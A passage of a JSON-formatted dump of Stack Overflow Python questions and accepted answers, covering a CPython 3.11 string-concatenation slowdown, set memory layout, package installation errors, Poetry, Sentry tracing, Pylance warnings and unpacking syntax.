    "AcceptedAnswer": "TL;DR: you should not use such a loop in any performance critical code but ''.join instead. The inefficient execution appears to be related to a regression during the bytecode generation in CPython 3.11 (and missing optimizations during the evaluation of binary add operation on Unicode strings).\n\nGeneral guidelines\nThis is an antipattern. You should not write such a code if you want this to be fast. This is described in PEP-8:\n\nCode should be written in a way that does not disadvantage other implementations of Python (PyPy, Jython, IronPython, Cython, Psyco, and such). \nFor example, do not rely on CPython\u2019s efficient implementation of in-place string concatenation for statements in the form a += b or a = a + b. This optimization is fragile even in CPython (it only works for some types) and isn\u2019t present at all in implementations that don\u2019t use refcounting. In performance sensitive parts of the library, the ''.join() form should be used instead. This will ensure that concatenation occurs in linear time across various implementations.\n\nIndeed, other implementations like PyPy does not perform an efficient in-place string concatenation for example. A new bigger string is created for every iteration (since strings are immutable, the previous one may be referenced and PyPy does not use a reference counting but a garbage collector). This results in a quadratic runtime as opposed to a linear runtime in CPython (at least in past implementation).\n\nDeep Analysis\nI can reproduce the problem on Windows 10 between the embedded (64-bit x86-64) version of CPython 3.10.8 and the one of 3.11.0:\nTimings:\n - CPython 3.10.8:    146.4 ms\n - CPython 3.11.0:  15186.8 ms\n\nIt turns out the code has not particularly changed between CPython 3.10 and 3.11 when it comes to Unicode string appending. See for example PyUnicode_Append: 3.10 and 3.11.\nA low-level profiling analysis shows that nearly all the time is spent in one unnamed function call of another unnamed function called by PyUnicode_Concat (which is also left unmodified between CPython 3.10.8 and 3.11.0). This slow unnamed function contains a pretty small set of assembly instructions and nearly all the time is spent in one unique x86-64 assembly instruction: rep movsb byte ptr [rdi], byte ptr [rsi]. This instruction is basically meant to copy a buffer pointed by the rsi register to a buffer pointed by the rdi register (the processor copy rcx bytes for the source buffer to the destination buffer and decrement the rcx register for each byte until it reach 0). This information shows that the unnamed function is actually memcpy of the standard MSVC C runtime (ie. CRT) which appears to be called by _copy_characters itself called by _PyUnicode_FastCopyCharacters of PyUnicode_Concat (all the functions are still belonging to the same file). However, these CPython functions are still left unmodified between CPython 3.10.8 and 3.11.0. The non-negligible time spent in malloc/free (about 0.3 seconds) seems to indicate that a lot of new string objects are created -- certainly at least 1 per iteration -- matching with the call to PyUnicode_New in the code of PyUnicode_Concat. All of this indicates that a new bigger string is created and copied as specified above.\nThe thing is calling PyUnicode_Concat is certainly the root of the performance issue here and I think CPython 3.10.8 is faster because it certainly calls PyUnicode_Append instead. Both calls are directly performed by the main big interpreter evaluation loop and this loop is driven by the generated bytecode.\nIt turns out that the generated bytecode is different between the two version and it is the root of the performance issue. Indeed, CPython 3.10 generates an INPLACE_ADD bytecode instruction while CPython 3.11 generates a  BINARY_OP bytecode instruction. Here is the bytecode for the loops in the two versions:\nCPython 3.10 loop:\n\n        >>   28 FOR_ITER                 6 (to 42)\n             30 STORE_NAME               4 (_)\n  6          32 LOAD_NAME                1 (a)\n             34 LOAD_CONST               2 ('a')\n             36 INPLACE_ADD                             <----------\n             38 STORE_NAME               1 (a)\n             40 JUMP_ABSOLUTE           14 (to 28)\n\nCPython 3.11 loop:\n\n        >>   66 FOR_ITER                 7 (to 82)\n             68 STORE_NAME               4 (_)\n  6          70 LOAD_NAME                1 (a)\n             72 LOAD_CONST               2 ('a')\n             74 BINARY_OP               13 (+=)         <----------\n             78 STORE_NAME               1 (a)\n             80 JUMP_BACKWARD            8 (to 66)\n\nThis changes appears to come from this issue. The code of the main interpreter loop (see ceval.c) is different between the two CPython version. Here are the code executed by the two versions:\n        // In CPython 3.10.8\n        case TARGET(INPLACE_ADD): {\n            PyObject *right = POP();\n            PyObject *left = TOP();\n            PyObject *sum;\n            if (PyUnicode_CheckExact(left) && PyUnicode_CheckExact(right)) {\n                sum = unicode_concatenate(tstate, left, right, f, next_instr); // <-----\n                /* unicode_concatenate consumed the ref to left */\n            }\n            else {\n                sum = PyNumber_InPlaceAdd(left, right);\n                Py_DECREF(left);\n            }\n            Py_DECREF(right);\n            SET_TOP(sum);\n            if (sum == NULL)\n                goto error;\n            DISPATCH();\n        }\n\n//----------------------------------------------------------------------------\n\n        // In CPython 3.11.0\n        TARGET(BINARY_OP_ADD_UNICODE) {\n            assert(cframe.use_tracing == 0);\n            PyObject *left = SECOND();\n            PyObject *right = TOP();\n            DEOPT_IF(!PyUnicode_CheckExact(left), BINARY_OP);\n            DEOPT_IF(Py_TYPE(right) != Py_TYPE(left), BINARY_OP);\n            STAT_INC(BINARY_OP, hit);\n            PyObject *res = PyUnicode_Concat(left, right); // <-----\n            STACK_SHRINK(1);\n            SET_TOP(res);\n            _Py_DECREF_SPECIALIZED(left, _PyUnicode_ExactDealloc);\n            _Py_DECREF_SPECIALIZED(right, _PyUnicode_ExactDealloc);\n            if (TOP() == NULL) {\n                goto error;\n            }\n            JUMPBY(INLINE_CACHE_ENTRIES_BINARY_OP);\n            DISPATCH();\n        }\n\nNote that unicode_concatenate calls PyUnicode_Append (and do some reference counting checks before). In the end, CPython 3.10.8 calls PyUnicode_Append which is fast (in-place) and CPython 3.11.0 calls PyUnicode_Concat which is slow (out-of-place). It clearly looks like a regression to me.\nPeople in the comments reported having no performance issue on Linux. However, experimental tests shows a BINARY_OP instruction is also generated on Linux, and I cannot find so far any Linux-specific optimization regarding string concatenation. Thus, the difference between the platforms is pretty surprising.\n\nUpdate: towards a fix\nI have opened an issue about this available here. One should not that putting the code in a function is significantly faster due to the variable being local (as pointed out by @Dennis in the comments).\n\nRelated posts:\n\nHow slow is Python's string concatenation vs. str.join?\nPython string 'join' is faster (?) than '+', but what's wrong here?\nPython string concatenation in for-loop in-place?\n\n"
}
{
    "Id": 74606984,
    "PostTypeId": 1,
    "Title": "How are small sets stored in memory?",
    "Body": "If we look at the resize behavior for sets under 50k elements:\n>>> import sys\n>>> s = set()\n>>> seen = {}\n>>> for i in range(50_000):\n...     size = sys.getsizeof(s)\n...     if size not in seen:\n...         seen[size] = len(s)\n...         print(f\"{size=} {len(s)=}\")\n...     s.add(i)\n... \nsize=216 len(s)=0\nsize=728 len(s)=5\nsize=2264 len(s)=19\nsize=8408 len(s)=77\nsize=32984 len(s)=307\nsize=131288 len(s)=1229\nsize=524504 len(s)=4915\nsize=2097368 len(s)=19661\n\nThis pattern is consistent with quadrupling of the backing storage size once the set is 3/5ths full, plus some presumably constant overhead for the PySetObject:\n>>> for i in range(9, 22, 2):\n...     print(2**i + 216)\n... \n728\n2264\n8408\n32984\n131288\n524504\n2097368\n\nA similar pattern continues even for larger sets, but the resize factor switches to doubling instead of quadrupling.\nThe reported size for small sets is an outlier. Instead of size 344 bytes, i.e. 16 * 8 + 216 (the storage array of a newly created empty set has 8 slots avail until the first resize up to 32 slots) only 216 bytes is reported by sys.getsizeof.\nWhat am I missing? How are those small sets stored so that they use only 216 bytes instead of 344?\n",
    "AcceptedAnswerId": 74612168,
    "AcceptedAnswer": "The set object in Python is represented by the following C structure.\ntypedef struct {\n    PyObject_HEAD\n\n    Py_ssize_t fill;            /* Number of active and dummy entries*/\n    Py_ssize_t used;            /* Number of active entries */\n\n    /* The table contains mask + 1 slots, and that's a power of 2.\n     * We store the mask instead of the size because the mask is more\n     * frequently needed.\n     */\n    Py_ssize_t mask;\n\n    /* The table points to a fixed-size smalltable for small tables\n     * or to additional malloc'ed memory for bigger tables.\n     * The table pointer is never NULL which saves us from repeated\n     * runtime null-tests.\n     */\n    setentry *table;\n    Py_hash_t hash;             /* Only used by frozenset objects */\n    Py_ssize_t finger;          /* Search finger for pop() */\n\n    setentry smalltable[PySet_MINSIZE];\n    PyObject *weakreflist;      /* List of weak references */\n} PySetObject;\n\nNow remember, getsizeof() calls the object\u2019s __sizeof__ method and adds an additional garbage collector overhead if the object is managed by the garbage collector.\nOk, set implements the __sizeof__.\nstatic PyObject *\nset_sizeof(PySetObject *so, PyObject *Py_UNUSED(ignored))\n{\n    Py_ssize_t res;\n\n    res = _PyObject_SIZE(Py_TYPE(so));\n    if (so->table != so->smalltable)\n        res = res + (so->mask + 1) * sizeof(setentry);\n    return PyLong_FromSsize_t(res);\n}\n\nNow let\u2019s inspect the line\nres = _PyObject_SIZE(Py_TYPE(so));\n\n_PyObject_SIZE is just a macro which expands to (typeobj)->tp_basicsize.\n#define _PyObject_SIZE(typeobj) ( (typeobj)->tp_basicsize )\n\nThis code is essentially trying to access the tp_basicsize slot to get the size in bytes of instances of the type which is just sizeof(PySetObject) in case of set.\nPyTypeObject PySet_Type = {\n    PyVarObject_HEAD_INIT(&PyType_Type, 0)\n    \"set\",                              /* tp_name */\n    sizeof(PySetObject),                /* tp_basicsize */\n    0,                                  /* tp_itemsize */\n    # Skipped rest of the code for brevity.\n\nI have modified the set_sizeof C function with the following changes.\nstatic PyObject *\nset_sizeof(PySetObject *so, PyObject *Py_UNUSED(ignored))\n{\n    Py_ssize_t res;\n\n    unsigned long py_object_head_size = sizeof(so->ob_base); // Because PyObject_HEAD expands to PyObject ob_base;\n    unsigned long fill_size = sizeof(so->fill);\n    unsigned long used_size = sizeof(so->used);\n    unsigned long mask_size = sizeof(so->mask);\n    unsigned long table_size = sizeof(so->table);\n    unsigned long hash_size = sizeof(so->hash);\n    unsigned long finger_size = sizeof(so->finger);\n    unsigned long smalltable_size = sizeof(so->smalltable);\n    unsigned long weakreflist_size = sizeof(so->weakreflist);\n    int is_using_fixed_size_smalltables = so->table == so->smalltable;\n\n    printf(\"| PySetObject Fields   | Size(bytes) |\\n\");\n    printf(\"|------------------------------------|\\n\");\n    printf(\"|    PyObject_HEAD     |     '%zu'    |\\n\", py_object_head_size);\n    printf(\"|      fill            |      '%zu'    |\\n\", fill_size);\n    printf(\"|      used            |      '%zu'    |\\n\", used_size);\n    printf(\"|      mask            |      '%zu'    |\\n\", mask_size);\n    printf(\"|      table           |      '%zu'    |\\n\", table_size);\n    printf(\"|      hash            |      '%zu'    |\\n\", hash_size);\n    printf(\"|      finger          |      '%zu'    |\\n\", finger_size);\n    printf(\"|    smalltable        |    '%zu'    |\\n\", smalltable_size);\n    printf(\"|    weakreflist       |      '%zu'    |\\n\", weakreflist_size);\n    printf(\"-------------------------------------|\\n\");\n    printf(\"|       Total          |    '%zu'    |\\n\", py_object_head_size+fill_size+used_size+mask_size+table_size+hash_size+finger_size+smalltable_size+weakreflist_size);\n    printf(\"\\n\");\n    printf(\"Total size of PySetObject '%zu' bytes\\n\", sizeof(PySetObject));\n    printf(\"Has set resized: '%s'\\n\", is_using_fixed_size_smalltables ? \"No\": \"Yes\");\n    if(!is_using_fixed_size_smalltables) {\n        printf(\"Size of malloc'ed table: '%zu' bytes\\n\", (so->mask + 1) * sizeof(setentry));\n    }\n\n    res = _PyObject_SIZE(Py_TYPE(so));\n    if (so->table != so->smalltable)\n        res = res + (so->mask + 1) * sizeof(setentry);\n    return PyLong_FromSsize_t(res);\n}\n\nand compiling and running these changes gives me\n>>> import sys\n>>>\n>>> set_ = set()\n>>> sys.getsizeof(set_)\n| PySetObject Fields   | Size(bytes) |\n|------------------------------------|\n|    PyObject_HEAD     |     '16'    |\n|      fill            |      '8'    |\n|      used            |      '8'    |\n|      mask            |      '8'    |\n|      table           |      '8'    |\n|      hash            |      '8'    |\n|      finger          |      '8'    |\n|    smalltable        |    '128'    |\n|    weakreflist       |      '8'    |\n-------------------------------------|\n|       Total          |    '200'    |\n\nTotal size of PySetObject '200' bytes\nHas set resized: 'No'\n216\n>>> set_.add(1)\n>>> set_.add(2)\n>>> set_.add(3)\n>>> set_.add(4)\n>>> set_.add(5)\n>>> sys.getsizeof(set_)\n| PySetObject Fields   | Size(bytes) |\n|------------------------------------|\n|    PyObject_HEAD     |     '16'    |\n|      fill            |      '8'    |\n|      used            |      '8'    |\n|      mask            |      '8'    |\n|      table           |      '8'    |\n|      hash            |      '8'    |\n|      finger          |      '8'    |\n|    smalltable        |    '128'    |\n|    weakreflist       |      '8'    |\n-------------------------------------|\n|       Total          |    '200'    |\n\nTotal size of PySetObject '200' bytes\nHas set resized: 'Yes'\nSize of malloc'ed table: '512' bytes\n728\n\nThe return value is 216/728 bytes because sys.getsize add 16 bytes of GC overhead.\nBut the important thing to note here is this line.\n|    smalltable        |    '128'    |\n\nBecause for small tables(before the first resize) so->table is just a reference to fixed size(8) so->smalltable(No malloc'ed memory) so sizeof(PySetObject) is sufficient enough to get the size because it also includes the storage size( 128(16(size of setentry) * 8)).\nNow what happens when the resize occurs? It constructs entirely new table (malloc'ed) and uses that table instead of so->smalltables. This means that the sets, which have resized, also carry out a dead-weight of 128 bytes (size of fixed size small table) along with the size of malloc'ed so->table.\nelse {\n        newtable = PyMem_NEW(setentry, newsize);\n        if (newtable == NULL) {\n            PyErr_NoMemory();\n            return -1;\n        }\n    }\n\n    /* Make the set empty, using the new table. */\n    assert(newtable != oldtable);\n    memset(newtable, 0, sizeof(setentry) * newsize);\n    so->mask = newsize - 1;\n    so->table = newtable;\n\n"
}
{
    "Id": 74314778,
    "PostTypeId": 1,
    "Title": "NameError: name 'glPushMatrix' is not defined",
    "Body": "Try to run a test code for stable baselines gym\nimport gym\n\nfrom stable_baselines3 import A2C\n\nenv = gym.make(\"CartPole-v1\")\n\nmodel = A2C(\"MlpPolicy\", env, verbose=1)\nmodel.learn(total_timesteps=10_000)\n\nobs = env.reset()\nfor i in range(100):\n    action, _state = model.predict(obs, deterministic=True)\n    obs, reward, done, info = env.step(action)\n    env.render()\n    if done:\n      obs = env.reset()\n\nfound the error \"NameError: name 'glPushMatrix' is not defined\"\nTraceback (most recent call last):\n  File \"test_cart_pole.py\", line 14, in \n    env.render()\n  File \"/Users/xxx/opt/anaconda3/lib/python3.8/site-packages/gym/core.py\", line 295, in render\n    return self.env.render(mode, **kwargs)\n  File \"/Users/xxx/opt/anaconda3/lib/python3.8/site-packages/gym/envs/classic_control/cartpole.py\", line 229, in render\n    return self.viewer.render(return_rgb_array=mode == \"rgb_array\")\n  File \"/Users/xxx/opt/anaconda3/lib/python3.8/site-packages/gym/envs/classic_control/rendering.py\", line 126, in render\n    self.transform.enable()\n  File \"/Users/xxx/opt/anaconda3/lib/python3.8/site-packages/gym/envs/classic_control/rendering.py\", line 232, in enable\n    glPushMatrix()\nNameError: name 'glPushMatrix' is not defined\n\nI  tried  \"pip install PyOpenGL PyOpenGL_accelerate\", which didn't help\nalso uninstall pyglet and install again , did't work too\nAny Idea???\n",
    "AcceptedAnswerId": 74324578,
    "AcceptedAnswer": "Just had the same problem. Fixed it by installing an older version of pyglet:\n$ pip install pyglet==1.5.27\n\nI don't know if this is the latest version that avoids the problem, but it works.\n"
}
{
    "Id": 73144451,
    "PostTypeId": 1,
    "Title": "ModuleNotFoundError: No module named 'setuptools.command.build'",
    "Body": "I am trying to pip install sentence transformers. I am working on a Macbook pro with an M1 chip. I am using the following command:\n\npip3 install -U sentence-transformers\n\nWhen I run this, I get this error/output and I do not know how to fix it...\nDefaulting to user installation because normal site-packages is not writeable\nCollecting sentence-transformers\n  Using cached sentence-transformers-2.2.2.tar.gz (85 kB)\n  Preparing metadata (setup.py) ... done\nCollecting transformers=4.6.0\n  Using cached transformers-4.21.0-py3-none-any.whl (4.7 MB)\nCollecting tqdm\n  Using cached tqdm-4.64.0-py2.py3-none-any.whl (78 kB)\nRequirement already satisfied: torch>=1.6.0 in ./Library/Python/3.8/lib/python/site-packages (from sentence-transformers) (1.12.0)\nCollecting torchvision\n  Using cached torchvision-0.13.0-cp38-cp38-macosx_11_0_arm64.whl (1.2 MB)\nRequirement already satisfied: numpy in ./Library/Python/3.8/lib/python/site-packages (from sentence-transformers) (1.23.1)\nCollecting scikit-learn\n  Using cached scikit_learn-1.1.1-cp38-cp38-macosx_12_0_arm64.whl (7.6 MB)\nCollecting scipy\n  Using cached scipy-1.8.1-cp38-cp38-macosx_12_0_arm64.whl (28.6 MB)\nCollecting nltk\n  Using cached nltk-3.7-py3-none-any.whl (1.5 MB)\nCollecting sentencepiece\n  Using cached sentencepiece-0.1.96.tar.gz (508 kB)\n  Preparing metadata (setup.py) ... done\nCollecting huggingface-hub>=0.4.0\n  Using cached huggingface_hub-0.8.1-py3-none-any.whl (101 kB)\nCollecting requests\n  Using cached requests-2.28.1-py3-none-any.whl (62 kB)\nCollecting pyyaml>=5.1\n  Using cached PyYAML-6.0.tar.gz (124 kB)\n  Installing build dependencies ... done\n  Getting requirements to build wheel ... done\n  Preparing metadata (pyproject.toml) ... done\nRequirement already satisfied: typing-extensions>=3.7.4.3 in ./Library/Python/3.8/lib/python/site-packages (from huggingface-hub>=0.4.0->sentence-transformers) (4.3.0)\nRequirement already satisfied: filelock in ./Library/Python/3.8/lib/python/site-packages (from huggingface-hub>=0.4.0->sentence-transformers) (3.7.1)\nRequirement already satisfied: packaging>=20.9 in ./Library/Python/3.8/lib/python/site-packages (from huggingface-hub>=0.4.0->sentence-transformers) (21.3)\nCollecting tokenizers!=0.11.3,=0.11.1\n  Using cached tokenizers-0.12.1.tar.gz (220 kB)\n  Installing build dependencies ... done\n  Getting requirements to build wheel ... error\n  error: subprocess-exited-with-error\n  \n  \u00d7 Getting requirements to build wheel did not run successfully.\n  \u2502 exit code: 1\n  \u2570\u2500> [20 lines of output]\n      Traceback (most recent call last):\n        File \"/Users/joeyoneill/Library/Python/3.8/lib/python/site-packages/pip/_vendor/pep517/in_process/_in_process.py\", line 363, in \n          main()\n        File \"/Users/joeyoneill/Library/Python/3.8/lib/python/site-packages/pip/_vendor/pep517/in_process/_in_process.py\", line 345, in main\n          json_out['return_val'] = hook(**hook_input['kwargs'])\n        File \"/Users/joeyoneill/Library/Python/3.8/lib/python/site-packages/pip/_vendor/pep517/in_process/_in_process.py\", line 130, in get_requires_for_build_wheel\n          return hook(config_settings)\n        File \"/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/site-packages/setuptools/build_meta.py\", line 146, in get_requires_for_build_wheel\n          return self._get_build_requires(\n        File \"/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/site-packages/setuptools/build_meta.py\", line 127, in _get_build_requires\n          self.run_setup()\n        File \"/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/site-packages/setuptools/build_meta.py\", line 142, in run_setup\n          exec(compile(code, __file__, 'exec'), locals())\n        File \"setup.py\", line 2, in \n          from setuptools_rust import Binding, RustExtension\n        File \"/private/var/folders/bg/ncfh283n4t39vqhvbd5n9ckh0000gn/T/pip-build-env-vjj6eow8/overlay/lib/python3.8/site-packages/setuptools_rust/__init__.py\", line 1, in \n          from .build import build_rust\n        File \"/private/var/folders/bg/ncfh283n4t39vqhvbd5n9ckh0000gn/T/pip-build-env-vjj6eow8/overlay/lib/python3.8/site-packages/setuptools_rust/build.py\", line 20, in \n          from setuptools.command.build import build as CommandBuild  # type: ignore[import]\n      ModuleNotFoundError: No module named 'setuptools.command.build'\n      [end of output]\n  \n  note: This error originates from a subprocess, and is likely not a problem with pip.\nerror: subprocess-exited-with-error\n\n\u00d7 Getting requirements to build wheel did not run successfully.\n\u2502 exit code: 1\n\u2570\u2500> See above for output.\n\nnote: This error originates from a subprocess, and is likely not a problem with pip.\n\nCan anybody tell me what I should do or what is wrong with what I am currently doing? I factory reset my Mac and re-downloaded everything but I still get this same error. I am stumped.\n",
    "AcceptedAnswerId": 73868734,
    "AcceptedAnswer": "I posted this as an issue to the actual Sentence Transformers GitHub page. Around 4 days ago I was given this answer by a \"Federico Viticci\" which resolved the issue and allowed me to finally install the library:\n\"For what it is worth, I was having the exact issue. Installing it directly from source using\npip install git+https://github.com/huggingface/transformers\n\nfixed it on my M1 Max MacBook Pro.\"\nOriginal Git Issue here:\nhttps://github.com/UKPLab/sentence-transformers/issues/1652\n"
}
{
    "Id": 74398563,
    "PostTypeId": 1,
    "Title": "How to use polars dataframes with scikit-learn?",
    "Body": "I'm unable to use polars dataframes with scikitlearn for ML training.\nCurrently I'm doing all the dataframe preprocessing in polars and during model training i'm converting it into a pandas one in order for it to work.\nIs there any method to directly use polars dataframe as it is for ML training without changing it to pandas?\n",
    "AcceptedAnswerId": 74402124,
    "AcceptedAnswer": "You must call to_numpy when passing a DataFrame to sklearn. Though sometimes sklearn can work on polars Series it is still good type hygiene to transform to the type the host library expects.\nimport polars as pl\nfrom sklearn.linear_model import LinearRegression\n\ndata = pl.DataFrame(\n    np.random.randn(100, 5)\n)\n\nx = data.select([\n    pl.all().exclude(\"column_0\"),\n])\n\ny = data.select(pl.col(\"column_0\").alias(\"y\"))\n\n\nx_train = x[:80]\ny_train = y[:80]\n\nx_test = x[80:]\ny_test = y[80:]\n\n\nm = LinearRegression()\n\nm.fit(X=x_train.to_numpy(), y=y_train.to_numpy())\nm.predict(x_test.to_numpy())\n\n"
}
{
    "Id": 73876790,
    "PostTypeId": 1,
    "Title": "Poetry configuration is invalid - Additional properties are not allowed ('group' was unexpected)",
    "Body": "Recently, I faced this issue with Poetry. All my commands using poetry were failing with the following error.\nRuntimeError\n\n  The Poetry configuration is invalid:\n    - Additional properties are not allowed ('group' was unexpected)\n\n",
    "AcceptedAnswerId": 73876791,
    "AcceptedAnswer": "I figured out the following issue.\n\nThe code owners had updated the poetry core requirement to requires = [\"poetry-core>=1.2.0\"]\nMy current poetry version was 1.1.12\n\nI did the following to fix my issue.\n# remove the current poetry installation\nrm -rf /Users/myusername/.poetry\n\n# upgrade poetry version\npip install poetry -U\n\nThis should solve the problem. I verified the same by running my other poetry commands.\n\nIt should be noted that your current poetry configurations will be lost while doing this, and would need to be recreated and reinstalled.\n\n# reinstall poetry for my project\npoetry install\n\n"
}
{
    "Id": 74454587,
    "PostTypeId": 1,
    "Title": "sentry sdk custom performance integration for python app",
    "Body": "Sentry can track performance for celery tasks and API endpoints\nhttps://docs.sentry.io/product/performance/\nI have custom script that are lunching by crone and do set of similar tasks\nI want to incorporated sentry_sdk into my script to get performance tracing of my tasks\nAny advise how to do it with\nhttps://getsentry.github.io/sentry-python/api.html#sentry_sdk.capture_event\n",
    "AcceptedAnswerId": 74481555,
    "AcceptedAnswer": "You don't need use capture_event\nI would suggest to use sentry_sdk.start_transaction instead. It also allows track your function performance.\nLook at my example\nfrom time import sleep\nfrom sentry_sdk import Hub, init, start_transaction\n\ninit(\n    dsn=\"dsn\",\n    traces_sample_rate=1.0,\n)\n\n\ndef sentry_trace(func):\n    def wrapper(*args, **kwargs):\n        transaction = Hub.current.scope.transaction\n        if transaction:\n            with transaction.start_child(op=func.__name__):\n                return func(*args, **kwargs)\n        else:\n            with start_transaction(op=func.__name__, name=func.__name__):\n                return func(*args, **kwargs)\n\n    return wrapper\n\n\n@sentry_trace\ndef b():\n    for i in range(1000):\n        print(i)\n\n\n@sentry_trace\ndef c():\n    sleep(2)\n    print(1)\n\n\n@sentry_trace\ndef a():\n    sleep(1)\n    b()\n    c()\n\n\nif __name__ == '__main__':\n    a()\n\nAfter starting this code you can see basic info of transaction a with childs b and c\n\n"
}
{
    "Id": 74556349,
    "PostTypeId": 1,
    "Title": "No module named 'huggingface_hub.snapshot_download'",
    "Body": "When I try to run the quick start notebook of this repo, I get the error ModuleNotFoundError: No module named 'huggingface_hub.snapshot_download'. How can I fix it? I already installed huggingface_hub using pip.\nI get the error after compiling the following cell:\n!CUDA_VISIBLE_DEVICES=0 python -u ../scripts/main.py --summarizer gpt3_summarizer --controller longformer_classifier longformer_classifier --loader alignment coherence --controller-load-dir emnlp22_re3_data/ckpt/relevance_reranker emnlp22_re3_data/ckpt/coherence_reranker --controller-model-string allenai/longformer-base-4096 allenai/longformer-base-4096 --save-outline-file output/outline0.pkl --save-complete-file output/complete_story0.pkl --log-file output/story0.log\n\nHere's the entire output:\nTraceback (most recent call last):\n  File \"../scripts/main.py\", line 20, in \n    from story_generation.edit_module.entity import *\n  File \"/home/jovyan/emnlp22-re3-story-generation/story_generation/edit_module/entity.py\", line 20, in \n    from story_generation.common.util import *\n  File \"/home/jovyan/emnlp22-re3-story-generation/story_generation/common/util.py\", line 13, in \n    from sentence_transformers import SentenceTransformer\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/__init__.py\", line 3, in \n    from .datasets import SentencesDataset, ParallelSentencesDataset\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/datasets/__init__.py\", line 3, in \n    from .ParallelSentencesDataset import ParallelSentencesDataset\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/datasets/ParallelSentencesDataset.py\", line 4, in \n    from .. import SentenceTransformer\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/SentenceTransformer.py\", line 25, in \n    from .evaluation import SentenceEvaluator\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/evaluation/__init__.py\", line 5, in \n    from .InformationRetrievalEvaluator import InformationRetrievalEvaluator\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/evaluation/InformationRetrievalEvaluator.py\", line 6, in \n    from ..util import cos_sim, dot_score\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/util.py\", line 407, in \n    from huggingface_hub.snapshot_download import REPO_ID_SEPARATOR\nModuleNotFoundError: No module named 'huggingface_hub.snapshot_download'\n\n",
    "AcceptedAnswerId": 74573811,
    "AcceptedAnswer": "Updating to the latest version of sentence-transformers fixes it (no need to install huggingface-hub explicitly):\npip install -U sentence-transformers\n\nI've proposed a pull request for this in the original repo.\n"
}
{
    "Id": 74660176,
    "PostTypeId": 1,
    "Title": "Using VisualStudio+ Python -- how to handle \"overriding stdlib module\" Pylance(reportShadowedImports) warning?",
    "Body": "When running ipynbs in VS Code, I've started noticing Pylance warnings on standard library imports. I am using a conda virtual environment, and I believe the warning is related to that. An example using the glob library reads:\n \"env\\Lib\\glob.py\" is overriding the stdlib \"glob\" modulePylance(reportShadowedImports)\nSo far my notebooks run as expected, but I am curious if this warning is indicative of poor layout or is just stating the obvious more of an \"FYI you are not using the base install of python\".\nI have turned off linting and the problem stills persists. And almost nothing returns from my searches of the error \"reportShadowedImports\".\n",
    "AcceptedAnswerId": 74675579,
    "AcceptedAnswer": "The reason you find nothing by searching is because this check has just been implemented recently (see Github). I ran into the same problem as you because code.py from Micropython/Circuitpython also overrides the module \"code\" in stdlib.\nThe solution is simple, though you then loose out on this specific check. Just add reportShadowedImports to your pyright config. For VS Code, that would be adding it to .vscode/settings.json:\n{\n  \"python.languageServer\": \"Pylance\",\n  [...]\n  \"python.analysis.diagnosticSeverityOverrides\": {\n      \"reportShadowedImports\": \"none\"\n  },\n  [...]\n}\n\n"
}
{
    "Id": 73888639,
    "PostTypeId": 1,
    "Title": "Why is this unpacking expression not allowed in python3.10?",
    "Body": "I used to unpack a long iterable expression like this:\nIn python 3.8.7:\n>>> _, a, (*_), c = [1,2,3,4,5,6]\n>>> a\n2\n>>> c\n6\n\nIn python 3.10.7:\n>>> _, a, (*_), c = [1,2,3,4,5,6]\n  File \"\", line 1\n    _, a, (*_), c = [1,2,3,4,5,6]\n           ^^\nSyntaxError: cannot use starred expression here\n\nI'm not sure which version of python between 3.8.7 and 3.10.7 introduced this backwards breaking behavior. What's the justification for this?\n",
    "AcceptedAnswerId": 73888752,
    "AcceptedAnswer": "There's an official discussion here. The most relevant quote I can find is:\n\n\nAlso the current behavior allows (*x), y = 1 assignment. If (*x) is to be totally disallowed, (*x), y = 1 should also be rejected.\n\n\n\nI agree.\n\nThe final \"I agree\" is from Guido van Rossum.\nThe rationale for rejecting (*x) was:\n\nHonestly this seems like a bug in 3.8 to me (if it indeed behaves like\nthis):\n>>> (*x), y (1, 2, 3)\n\nEvery time I mistakenly tried (*x) I really meant (*x,), so it's\nsurprising that (*x), y would be interpreted as (*x, y) rather than\nflagging (*x) as an error.\nPlease don't \"fix\" this even if it is a regression.\n\nAlso by Guido van Rossum. So it seems like (*x) was rejected because it looks too similar to unpacking into a singlet tuple.\n"
}
{
    "Id": 74583630,
    "PostTypeId": 1,
    "Title": "Why is Python saying modules are imported when they are not?",
    "Body": "Python 3.6.5\nUsing this answer as a guide, I attempted to see whether some modules, such as math were imported.\nBut Python tells me they are all imported when they are not.\n>>> import sys\n>>> 'math' in sys.modules\nTrue\n>>> 'math' not in sys.modules\nFalse\n>>> math.pi\nTraceback (most recent call last):\n  File \"\", line 1, in \nNameError: name 'math' is not defined\n>>> import math\n>>> 'math' in sys.modules\nTrue\n>>> math.pi\n3.141592653589793\n\n",
    "AcceptedAnswerId": 74583684,
    "AcceptedAnswer": "to explain this, let's define this function:\ndef import_math():\n    import math\n\nimport_math()\n\nthe above function will import the module math, but only in its local scope, anyone that tries to reference math outside of it will get a name error, because math is not defined in the global scope.\nany module that is imported is saved into sys.modules so a call to check\nimport_math()\nprint(\"math\" in sys.modules)\n\nwill print True, because sys.modules caches any module that is loaded anywhere, whether or not it was available in the global scope, a very simple way to define math in the global scope would then to\nimport_math()\nmath = sys.modules[\"math\"]\n\nwhich will convert it from being only in sys.modules to being in the global scope, this is just equivalent to\nimport math\n\nwhich defines a variable math in the global scope that points to the module math.\nnow if you want to see whether \"math\" exists in the global scope is to check if it is in the global scope directly.\nprint(\"math\" in globals())\nprint(\"math\" in locals())\n\nwhich will print false if \"math\" wasn't imported into the global or local scope and is therefore inaccessable.\n"
}
{
    "Id": 74508024,
    "PostTypeId": 1,
    "Title": "Is requirements.txt still needed when using pyproject.toml?",
